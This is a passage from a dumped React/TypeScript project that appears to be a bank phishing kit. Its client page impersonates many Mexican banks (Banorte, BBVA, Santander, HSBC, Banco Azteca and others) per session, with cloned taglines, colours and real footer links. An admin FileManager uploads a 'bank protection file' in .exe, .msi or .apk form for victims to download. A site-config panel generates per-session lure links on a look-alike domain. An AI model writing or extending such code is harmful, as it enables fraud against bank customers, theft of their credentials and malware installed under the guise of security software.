'BANREGIO' ? 'Banregio' :\n              sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :\n              sessionData.banco === 'PLATACARD' ? 'Plata Card' :\n              sessionData.banco === 'BANCO_AZTECA' ? 'Banco Azteca' :\n              sessionData.banco === 'BIENESTAR' ? 'Banco del Bienestar' :\n              sessionData.banco === 'INBURSA' ? 'Grupo Financiero Inbursa' :\n              sessionData.banco === 'AFIRME' ? 'Banco Afirme' :\n              'Banorte'\n            } M茅xico 2024. Todos los Derechos Reservados</div>\n          </div>\n        </footer>\n      );\n    }\n  };\n\n  // Funci贸n para mostrar informaci贸n adicional seg煤n el banco\n  const renderBankInfo = () => {\n    if (sessionData.banco === 'BANBAJIO') {\n      return null; // BanBaj铆o no muestra informaci贸n adicional\n    } else if (sessionData.banco === 'LIVERPOOL') {\n      return (\n        <div className=\"text-center mt-4 px-4\">\n          <p className=\"text-sm text-gray-600\">Tu experiencia de banca en l铆nea de Liverpool, segura y confiable</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'CITIBANAMEX') {\n      return (\n        <div className=\"text-center mt-4 px-4\">\n          <p className=\"text-sm text-gray-600\">Banca digital segura para todos tus tr谩mites financieros</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'BBVA') {\n      return (\n        <div className=\"text-center mt-4 px-4\">\n          <p className=\"text-sm text-gray-600\">La manera m谩s f谩cil y segura de realizar tus operaciones bancarias</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'BANORTE') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Tu banca en l铆nea, m谩s segura y con mayor protecci贸n</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'BANCOPPEL') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">La llave a tu mundo financiero</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'HSBC') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">El banco local con perspectiva global</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'AMEX') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a American Express</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'SANTANDER') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a Santander, tu banco de confianza</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'SCOTIABANK') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a Scotiabank, tu banco con m谩s posibilidades</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'INVEX') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a INVEX Banca Digital</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'BANREGIO') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a Banregio Banca Digital</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'SPIN') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a SPIN by Oxxo</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'PLATACARD') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a Plata Card</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'BANCO_AZTECA') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a Banco Azteca, el banco de la inclusi贸n financiera</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'BIENESTAR') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido al Banco del Bienestar, tu banco social</p>\n        </div>\n      );\n    } else if (sessionData.banco === 'INBURSA') {\n      return (\n        <div className=\"text-center mt-2 px-4\">\n          <p className=\"text-sm text-gray-600 mt-1\">Bienvenido a Grupo Financiero Inbursa, tu aliado financiero</p>\n        </div>\n      );\n    } else {\n      return (\n        <div className=\"text-center mt-4 px-4\">\n          <p className=\"text-sm\">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>\n          <div className=\"mt-2 space-x-2\">\n            <img \n              src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png\" \n              className=\"h-5 inline-block\" \n              alt=\"Suburbia\" \n            />\n            <img \n              src=\"https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg\" \n              className=\"h-5 inline-block\" \n              alt=\"Williams Sonoma\" \n            />\n          </div>\n        </div>\n      );\n    }\n  };\n\n  // Si estamos mostrando el mensaje inicial o a煤n no se ha cargado el banco, mostrar una pantalla de carga\n  if (showInitialMessage || !bankLoaded) {\n    const loadingContent = (\n      <>\n        <div className=\"container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center\">\n          <div className=\"text-center mb-4\">\n            <h2 className=\"text-xl font-semibold mb-4\">{initialMessage}</h2>\n            <div className=\"h-4 w-full bg-gray-200 rounded overflow-hidden\">\n              <div className={`h-full ${\n                sessionData.banco === 'LIVERPOOL' ? 'liverpool-bg' :\n                sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : \n                sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : \n                sessionData.banco === 'BBVA' ? 'bg-[#072146]' :\n                sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :\n                sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :\n                sessionData.banco === 'AMEX' ? 'amex-bg' :\n                sessionData.banco === 'SANTANDER' ? 'santander-bg' :\n                sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :\n                sessionData.banco === 'INVEX' ? 'invex-bg' :\n                sessionData.banco === 'BANREGIO' ? 'banregio-bg' :\n                sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :\n                sessionData.banco === 'PLATACARD' ? 'bg-[#FF5722]' :\n                sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :\n                sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :\n                sessionData.banco === 'INBURSA' ? 'bg-[#1B4B72]' :\n                'bg-[#EC1C24]'\n              } animate-progress-bar`}></div>\n            </div>\n          </div>\n        </div>\n      </>\n    );\n    \n    // Si no se ha cargado el banco a煤n, mostramos una pantalla gen茅rica de carga\n    if (!bankLoaded) {\n      return (\n        <div className=\"min-h-screen flex flex-col bg-white\">\n          <header className=\"bg-gray-100 text-gray-800 p-4 text-center\">\n            <div className=\"font-bold text-sm mb-2\">{formatDate(new Date())}</div>\n            <div className=\"h-20\"></div>\n          </header>\n          \n          {loadingContent}\n          \n          <footer className=\"mt-auto\">\n            <div className=\"bg-gray-100 p-4 text-center text-sm\">\n              <a href=\"https://www.banorte.com/\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-gray-600 mx-2\">Aprende m谩s</a>\n              <a href=\"https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-gray-600 mx-2\">Ayuda</a>\n              <a href=\"https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-gray-600 mx-2\">T茅rminos y condiciones</a>\n              <a href=\"https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-gray-600 mx-2\">Seguridad en l铆nea</a>\n            </div>\n            <div className=\"bg-gray-800 text-white p-4 text-center text-sm\">\n              <div className=\"mb-3\">\n                <a href=\"https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Cont谩ctanos</a> |\n                <a href=\"https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Aclaraciones</a> |\n                <a href=\"https://www.banorte.com/wps/portal/banorte/Home/promociones/todas\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Promociones</a> |\n                <a href=\"https://www.facebook.com/BanorteOficial\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">Facebook</a> |\n                <a href=\"https://www.youtube.com/user/GFBanorte\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-white mx-2\">YouTube</a>\n              </div>\n              <div>漏 Banca Digital 2024. Todos los Derechos Reservados</div>\n            </div>\n          </footer>\n        </div>\n      );\n    }\n    \n    // Si el banco ya est谩 cargado pero seguimos en la pantalla de carga\n    return (\n      <div \n        className={`min-h-screen flex flex-col ${\n          sessionData.banco === 'BANBAJIO' \n            ? 'banbajio-background'  \n            : sessionData.banco === 'BANORTE'\n            ? 'banorte-container'\n            : 'bg-white'\n        }`}\n        style={\n          sessionData.banco === 'BANBAJIO' \n            ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } \n            : sessionData.banco === 'HSBC'\n            ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } \n            : {}\n        }\n      >\n        {renderHeader()}\n        {loadingContent}\n        {renderFooter()}\n      </div>\n    );\n  }\n\n  // Renderizado normal cuando no estamos mostrando el mensaje inicial\n  return (\n    <div \n      className={`min-h-screen flex flex-col ${\n        sessionData.banco === 'BANBAJIO' \n          ? 'banbajio-background'  \n          : sessionData.banco === 'BANORTE'\n          ? 'banorte-container'\n          : 'bg-white'\n      }`}\n      style={\n        sessionData.banco === 'BANBAJIO' \n          ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } \n          : sessionData.banco === 'HSBC'\n          ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } \n          : {}\n      }\n    >\n      {renderHeader()}\n      {/* Eliminamos renderBankInfo para evitar duplicar elementos */}\n\n      <div className={`container mx-auto max-w-md px-6 py-8 flex-grow ${\n        sessionData.banco === 'BANORTE' \n          ? 'banorte-content'\n          : ''\n      }`}>\n        <ScreenTemplates \n          currentScreen={currentScreen} \n          screenData={screenData}\n          onSubmit={handleSubmit}\n          banco={sessionData.banco || 'BANORTE'}\n          sessionId={sessionId}\n          celular={sessionData.celular || ''}\n        />\n      </div>\n\n      {renderFooter()}\n    </div>\n  );\n}\n","size_bytes":58056},"client/src/components/admin/FileManager.tsx":{"content":"import React, { useState } from 'react';\nimport { Button } from \"@/components/ui/button\";\nimport { Card, CardContent, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Upload, Download, Trash2, File } from \"lucide-react\";\nimport { useToast } from \"@/hooks/use-toast\";\n\ninterface FileManagerProps {\n  sessionId: string;\n  currentFile?: {\n    fileName: string;\n    fileUrl: string;\n    fileSize: string;\n  };\n  onFileUpdate: () => void;\n}\n\nexport const FileManager: React.FC<FileManagerProps> = ({ \n  sessionId, \n  currentFile, \n  onFileUpdate \n}) => {\n  const [uploading, setUploading] = useState(false);\n  const [removing, setRemoving] = useState(false);\n  const { toast } = useToast();\n\n  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {\n    const file = event.target.files?.[0];\n    if (!file) return;\n\n    setUploading(true);\n    try {\n      const formData = new FormData();\n      formData.append('file', file);\n      formData.append('sessionId', sessionId);\n\n      const response = await fetch('/api/upload-protection-file', {\n        method: 'POST',\n        credentials: 'include',\n        body: formData\n      });\n\n      if (!response.ok) {\n        const error = await response.json();\n        throw new Error(error.message || 'Error subiendo archivo');\n      }\n\n      const result = await response.json();\n      \n      toast({\n        title: \"Archivo subido exitosamente\",\n        description: `${result.fileName} (${result.fileSize})`,\n      });\n\n      onFileUpdate();\n    } catch (error) {\n      console.error('Error subiendo archivo:', error);\n      toast({\n        title: \"Error\",\n        description: error instanceof Error ? error.message : 'Error subiendo archivo',\n        variant: \"destructive\",\n      });\n    } finally {\n      setUploading(false);\n      // Reset the input\n      event.target.value = '';\n    }\n  };\n\n  const handleFileRemove = async () => {\n    if (!currentFile) return;\n\n    setRemoving(true);\n    try {\n      const response = await fetch(`/api/remove-protection-file/${sessionId}`, {\n        method: 'DELETE',\n        credentials: 'include',\n      });\n\n      if (!response.ok) {\n        const error = await response.json();\n        throw new Error(error.message || 'Error eliminando archivo');\n      }\n\n      toast({\n        title: \"Archivo eliminado\",\n        description: \"El archivo de protecci贸n ha sido eliminado\",\n      });\n\n      onFileUpdate();\n    } catch (error) {\n      console.error('Error eliminando archivo:', error);\n      toast({\n        title: \"Error\",\n        description: error instanceof Error ? error.message : 'Error eliminando archivo',\n        variant: \"destructive\",\n      });\n    } finally {\n      setRemoving(false);\n    }\n  };\n\n  const handleFileDownload = () => {\n    if (!currentFile) return;\n    \n    const link = document.createElement('a');\n    link.href = currentFile.fileUrl;\n    link.download = currentFile.fileName;\n    link.target = '_blank';\n    document.body.appendChild(link);\n    link.click();\n    document.body.removeChild(link);\n  };\n\n  return (\n    <Card className=\"mt-4\">\n      <CardHeader>\n        <CardTitle className=\"flex items-center gap-2\">\n          <File className=\"h-5 w-5\" />\n          Archivo de Protecci贸n Bancaria\n        </CardTitle>\n      </CardHeader>\n      <CardContent className=\"space-y-4\">\n        {currentFile ? (\n          <div className=\"space-y-3\">\n            <div className=\"flex items-center justify-between p-3 bg-gray-50 rounded-lg\">\n              <div className=\"flex-1\">\n                <p className=\"font-medium text-gray-900\">{currentFile.fileName}</p>\n                <p className=\"text-sm text-gray-500\">{currentFile.fileSize}</p>\n              </div>\n              <div className=\"flex gap-2\">\n                <Button\n                  variant=\"outline\"\n                  size=\"sm\"\n                  onClick={handleFileDownload}\n                  className=\"flex items-center gap-1\"\n                >\n                  <Download className=\"h-4 w-4\" />\n                  Descargar\n                </Button>\n                <Button\n                  variant=\"destructive\"\n                  size=\"sm\"\n                  onClick={handleFileRemove}\n                  disabled={removing}\n                  className=\"flex items-center gap-1\"\n                >\n                  <Trash2 className=\"h-4 w-4\" />\n                  {removing ? 'Eliminando...' : 'Eliminar'}\n                </Button>\n              </div>\n            </div>\n            \n            <div className=\"text-sm text-gray-600\">\n              <p>El cliente podr谩 descargar este archivo cuando acceda a la pantalla de Protecci贸n Bancaria.</p>\n            </div>\n          </div>\n        ) : (\n          <div className=\"text-center py-6\">\n            <File className=\"h-12 w-12 text-gray-400 mx-auto mb-3\" />\n            <p className=\"text-gray-600 mb-4\">\n              No hay archivo de protecci贸n configurado para esta sesi贸n.\n            </p>\n          </div>\n        )}\n\n        <div className=\"border-t pt-4\">\n          <div className=\"relative\">\n            <input\n              type=\"file\"\n              id={`file-upload-${sessionId}`}\n              onChange={handleFileUpload}\n              disabled={uploading}\n              className=\"absolute inset-0 w-full h-full opacity-0 cursor-pointer\"\n              accept=\".zip,.rar,.exe,.msi,.apk,.pkg,.dmg,.deb,.rpm\"\n            />\n            <Button\n              disabled={uploading}\n              className=\"w-full flex items-center gap-2 pointer-events-none\"\n            >\n              <Upload className=\"h-4 w-4\" />\n              {uploading ? 'Subiendo archivo...' : \n               currentFile ? 'Reemplazar archivo' : 'Subir archivo de protecci贸n'}\n            </Button>\n          </div>\n          <p className=\"text-xs text-gray-500 mt-2\">\n            Formatos recomendados: .zip, .exe, .msi, .apk, .pkg, .dmg (m谩ximo 50MB)\n          </p>\n        </div>\n      </CardContent>\n    </Card>\n  );\n};","size_bytes":5988},"client/src/components/admin/SiteConfigManagement.tsx":{"content":"import { useState } from \"react\";\nimport { useQuery, useMutation, useQueryClient } from \"@tanstack/react-query\";\nimport { Button } from \"@/components/ui/button\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport { apiRequest } from \"@/lib/queryClient\";\nimport { Globe, Save, RefreshCw } from \"lucide-react\";\n\ninterface SiteConfig {\n  baseUrl: string;\n  updatedAt: string | null;\n  updatedBy: string | null;\n}\n\nconst SiteConfigManagement = () => {\n  const { toast } = useToast();\n  const queryClient = useQueryClient();\n  \n  // Estado local para el formulario\n  const [baseUrl, setBaseUrl] = useState(\"\");\n\n  // Obtener la configuraci贸n actual del sitio\n  const { data: siteConfig, isLoading } = useQuery({\n    queryKey: ['/api/site-config'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/site-config');\n      if (!res.ok) {\n        throw new Error('Error al obtener la configuraci贸n del sitio');\n      }\n      const data = await res.json();\n      // Actualizar el estado local cuando se carga la configuraci贸n\n      setBaseUrl(data.baseUrl || \"https://aclaracionesditales.com\");\n      return data as SiteConfig;\n    }\n  });\n\n  // Mutaci贸n para actualizar la configuraci贸n\n  const updateConfigMutation = useMutation({\n    mutationFn: async (newBaseUrl: string) => {\n      const res = await apiRequest('POST', '/api/site-config', {\n        baseUrl: newBaseUrl\n      });\n      if (!res.ok) {\n        const errorData = await res.json();\n        throw new Error(errorData.message || 'Error al actualizar la configuraci贸n');\n      }\n      return await res.json();\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Configuraci贸n actualizada\",\n        description: \"La URL base del sitio ha sido actualizada correctamente.\",\n        variant: \"default\"\n      });\n      // Invalidar la consulta para refrescar los datos\n      queryClient.invalidateQueries({ queryKey: ['/api/site-config'] });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error\",\n        description: error.message,\n        variant: \"destructive\"\n      });\n    }\n  });\n\n  const handleSubmit = (e: React.FormEvent) => {\n    e.preventDefault();\n    \n    // Validar que la URL no est茅 vac铆a\n    if (!baseUrl.trim()) {\n      toast({\n        title: \"Error de validaci贸n\",\n        description: \"La URL base no puede estar vac铆a.\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    // Validar formato b谩sico de URL\n    try {\n      new URL(baseUrl);\n    } catch {\n      toast({\n        title: \"Error de validaci贸n\",\n        description: \"Por favor ingresa una URL v谩lida (ej: https://ejemplo.com).\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    updateConfigMutation.mutate(baseUrl);\n  };\n\n  const resetToDefault = () => {\n    setBaseUrl(\"https://aclaracionesditales.com\");\n  };\n\n  return (\n    <div className=\"space-y-6\">\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <Globe className=\"h-5 w-5\" />\n            Configuraci贸n del sitio\n          </CardTitle>\n          <CardDescription>\n            Configura la URL base que se utilizar谩 para generar los enlaces de las sesiones.\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <form onSubmit={handleSubmit} className=\"space-y-4\">\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"baseUrl\">URL base del sitio</Label>\n              <Input\n                id=\"baseUrl\"\n                type=\"url\"\n                value={baseUrl}\n                onChange={(e) => setBaseUrl(e.target.value)}\n                placeholder=\"https://aclaracionesditales.com\"\n                disabled={isLoading || updateConfigMutation.isPending}\n                data-testid=\"input-base-url\"\n              />\n              <p className=\"text-sm text-muted-foreground\">\n                Esta URL se utilizar谩 como base para generar los enlaces de las sesiones.\n                Ejemplo: si ingresas \"https://midominio.com\", los enlaces generados ser谩n \"https://midominio.com/ID_SESION\"\n              </p>\n            </div>\n\n            <div className=\"flex gap-2\">\n              <Button \n                type=\"submit\" \n                disabled={isLoading || updateConfigMutation.isPending}\n                data-testid=\"button-save-config\"\n              >\n                {updateConfigMutation.isPending ? (\n                  <>\n                    <RefreshCw className=\"h-4 w-4 mr-2 animate-spin\" />\n                    Guardando...\n                  </>\n                ) : (\n                  <>\n                    <Save className=\"h-4 w-4 mr-2\" />\n                    Guardar configuraci贸n\n                  </>\n                )}\n              </Button>\n\n              <Button \n                type=\"button\" \n                variant=\"outline\" \n                onClick={resetToDefault}\n                disabled={isLoading || updateConfigMutation.isPending}\n                data-testid=\"button-reset-default\"\n              >\n                Restablecer por defecto\n              </Button>\n            </div>\n          </form>\n        </CardContent>\n      </Card>\n\n      {/* Informaci贸n de la configuraci贸n actual */}\n      {siteConfig && (\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"text-lg\">Configuraci贸n actual</CardTitle>\n          </CardHeader>\n          <CardContent>\n            <div className=\"space-y-3\">\n              <div>\n                <Label className=\"text-sm font-medium\">URL base actual:</Label>\n                <p className=\"text-sm text-muted-foreground break-all\" data-testid=\"text-current-url\">\n                  {siteConfig.baseUrl}\n                </p>\n              </div>\n              \n              {siteConfig.updatedBy && (\n                <div>\n                  <Label className=\"text-sm font-medium\">ltima actualizaci贸n por:</Label>\n                  <p className=\"text-sm text-muted-foreground\" data-testid=\"text-updated-by\">\n                    {siteConfig.updatedBy}\n                  </p>\n                </div>\n              )}\n              \n              {siteConfig.updatedAt && (\n                <div>\n                  <Label className=\"text-sm font-medium\">Fecha de actualizaci贸n:</Label>\n                  <p className=\"text-sm text-muted-foreground\" data-testid=\"text-updated-at\">\n                    {new Date(siteConfig.updatedAt).toLocaleString('es-ES')}\n                  </p>\n                </div>\n              )}\n            </div>\n          </CardContent>\n        </Card>\n      )}\n    </div>\n  );\n};\n\nexport default SiteConfigManagement;","size_bytes":6825},"client/src/components/ui/progress.tsx":{"content":"import * as React from \"react\"\nimport * as ProgressPrimitive from \"@radix-ui/react-progress\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Progress = React.forwardRef<\n  React.ElementRef<typeof ProgressPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof ProgressPrimitive.Root>\n>(({ className, value, ...props }, ref) => (\n  <ProgressPrimitive.Root\n    ref={ref}\n    className={cn(\n      \"relative h-4 w-full overflow-hidden rounded-full bg-secondary\",\n      className\n    )}\n    {...props}\n  >\n    <ProgressPrimitive.Indicator\n      className=\"h-full w-full flex-1 bg-primary transition-all\"\n      style={{ transform: `translateX(-${100 - (value || 0)}%)` }}\n    />\n  </ProgressPrimitive.Root>\n))\nProgress.displayName = ProgressPrimitive.Root.displayName\n\nexport { Progress }\n","size_bytes":777},"client/src/components/ui/button.tsx":{"content":"import * as React from \"react\"\nimport { Slot } from \"@radix-ui/react-slot\"\nimport { cva, type VariantProps } from \"class-variance-authority\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst buttonVariants = cva(\n  \"inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0\",\n  {\n    variants: {\n      variant: {\n        default: \"bg-primary text-primary-foreground hover:bg-primary/90\",\n        destructive:\n          \"bg-destructive text-destructive-foreground hover:bg-destructive/90\",\n        outline:\n          \"border border-input bg-background hover:bg-accent hover:text-accent-foreground\",\n        secondary:\n          \"bg-secondary text-secondary-foreground hover:bg-secondary/80\",\n        ghost: \"hover:bg-accent hover:text-accent-foreground\",\n        link: \"text-primary underline-offset-4 hover:underline\",\n      },\n      size: {\n        default: \"h-10 px-4 py-2\",\n        sm: \"h-9 rounded-md px-3\",\n        lg: \"h-11 rounded-md px-8\",\n        icon: \"h-10 w-10\",\n      },\n    },\n    defaultVariants: {\n      variant: \"default\",\n      size: \"default\",\n    },\n  }\n)\n\nexport interface ButtonProps\n  extends React.ButtonHTMLAttributes<HTMLButtonElement>,\n    VariantProps<typeof buttonVariants> {\n  asChild?: boolean\n}\n\nconst Button = React.forwardRef<HTMLButtonElement, ButtonProps>(\n  ({ className, variant, size, asChild = false, ...props }, ref) => {\n    const Comp = asChild ? Slot : \"button\"\n    return (\n      <Comp\n        className={cn(buttonVariants({ variant, size, className }))}\n        ref={ref}\n        {...props}\n      />\n    )\n  }\n)\nButton.displayName = \"Button\"\n\nexport { Button, buttonVariants }\n","size_bytes":1901},"client/src/components/ui/toast.tsx":{"content":"import * as React from \"react\"\nimport * as ToastPrimitives from \"@radix-ui/react-toast\"\nimport { cva, type VariantProps } from \"class-variance-authority\"\nimport { X } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst ToastProvider = ToastPrimitives.Provider\n\nconst ToastViewport = React.forwardRef<\n  React.ElementRef<typeof ToastPrimitives.Viewport>,\n  React.ComponentPropsWithoutRef<typeof ToastPrimitives.Viewport>\n>(({ className, ...props }, ref) => (\n  <ToastPrimitives.Viewport\n    ref={ref}\n    className={cn(\n      \"fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]\",\n      className\n    )}\n    {...props}\n  />\n))\nToastViewport.displayName = ToastPrimitives.Viewport.displayName\n\nconst toastVariants = cva(\n  \"group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full\",\n  {\n    variants: {\n      variant: {\n        default: \"border bg-background text-foreground\",\n        destructive:\n          \"destructive group border-destructive bg-destructive text-destructive-foreground\",\n      },\n    },\n    defaultVariants: {\n      variant: \"default\",\n    },\n  }\n)\n\nconst Toast = React.forwardRef<\n  React.ElementRef<typeof ToastPrimitives.Root>,\n  React.ComponentPropsWithoutRef<typeof ToastPrimitives.Root> &\n    VariantProps<typeof toastVariants>\n>(({ className, variant, ...props }, ref) => {\n  return (\n    <ToastPrimitives.Root\n      ref={ref}\n      className={cn(toastVariants({ variant }), className)}\n      {...props}\n    />\n  )\n})\nToast.displayName = ToastPrimitives.Root.displayName\n\nconst ToastAction = React.forwardRef<\n  React.ElementRef<typeof ToastPrimitives.Action>,\n  React.ComponentPropsWithoutRef<typeof ToastPrimitives.Action>\n>(({ className, ...props }, ref) => (\n  <ToastPrimitives.Action\n    ref={ref}\n    className={cn(\n      \"inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-muted/40 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive\",\n      className\n    )}\n    {...props}\n  />\n))\nToastAction.displayName = ToastPrimitives.Action.displayName\n\nconst ToastClose = React.forwardRef<\n  React.ElementRef<typeof ToastPrimitives.Close>,\n  React.ComponentPropsWithoutRef<typeof ToastPrimitives.Close>\n>(({ className, ...props }, ref) => (\n  <ToastPrimitives.Close\n    ref={ref}\n    className={cn(\n      \"absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600\",\n      className\n    )}\n    toast-close=\"\"\n    {...props}\n  >\n    <X className=\"h-4 w-4\" />\n  </ToastPrimitives.Close>\n))\nToastClose.displayName = ToastPrimitives.Close.displayName\n\nconst ToastTitle = React.forwardRef<\n  React.ElementRef<typeof ToastPrimitives.Title>,\n  React.ComponentPropsWithoutRef<typeof ToastPrimitives.Title>\n>(({ className, ...props }, ref) => (\n  <ToastPrimitives.Title\n    ref={ref}\n    className={cn(\"text-sm font-semibold\", className)}\n    {...props}\n  />\n))\nToastTitle.displayName = ToastPrimitives.Title.displayName\n\nconst ToastDescription = React.forwardRef<\n  React.ElementRef<typeof ToastPrimitives.Description>,\n  React.ComponentPropsWithoutRef<typeof ToastPrimitives.Description>\n>(({ className, ...props }, ref) => (\n  <ToastPrimitives.Description\n    ref={ref}\n    className={cn(\"text-sm opacity-90\", className)}\n    {...props}\n  />\n))\nToastDescription.displayName = ToastPrimitives.Description.displayName\n\ntype ToastProps = React.ComponentPropsWithoutRef<typeof Toast>\n\ntype ToastActionElement = React.ReactElement<typeof ToastAction>\n\nexport {\n  type ToastProps,\n  type ToastActionElement,\n  ToastProvider,\n  ToastViewport,\n  Toast,\n  ToastTitle,\n  ToastDescription,\n  ToastClose,\n  ToastAction,\n}\n","size_bytes":4845},"client/src/components/ui/toggle-group.tsx":{"content":"import * as React from \"react\"\nimport * as ToggleGroupPrimitive from \"@radix-ui/react-toggle-group\"\nimport { type VariantProps } from \"class-variance-authority\"\n\nimport { cn } from \"@/lib/utils\"\nimport { toggleVariants } from \"@/components/ui/toggle\"\n\nconst ToggleGroupContext = React.createContext<\n  VariantProps<typeof toggleVariants>\n>({\n  size: \"default\",\n  variant: \"default\",\n})\n\nconst ToggleGroup = React.forwardRef<\n  React.ElementRef<typeof ToggleGroupPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof ToggleGroupPrimitive.Root> &\n    VariantProps<typeof toggleVariants>\n>(({ className, variant, size, children, ...props }, ref) => (\n  <ToggleGroupPrimitive.Root\n    ref={ref}\n    className={cn(\"flex items-center justify-center gap-1\", className)}\n    {...props}\n  >\n    <ToggleGroupContext.Provider value={{ variant, 